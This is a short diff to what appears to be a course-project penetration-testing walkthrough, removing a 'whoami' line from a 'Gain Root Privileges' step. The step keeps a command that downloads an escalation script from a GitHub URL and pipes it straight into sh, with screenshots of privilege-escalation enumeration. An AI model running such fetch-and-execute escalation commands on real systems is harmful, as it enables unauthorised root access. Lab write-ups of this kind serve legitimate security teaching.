@@ -94,7 +94,6 @@ ls
 ## Step 15: Gain Root Privileges
 ```bash
 sh -c "$(curl -fsSL https://raw.githubusercontent.com/A0-2H/ICS344-CourseProject/main/phase1/custom/escalate.sh)"
-whoami
 ```
 ![25-run-lightpeas-script.png](../phase1/screenshots/25-run-lightpeas-script.png)
 ![26-lightpeas-enumeration-results.png](../phase1/screenshots/26-lightpeas-enumeration-results.png)
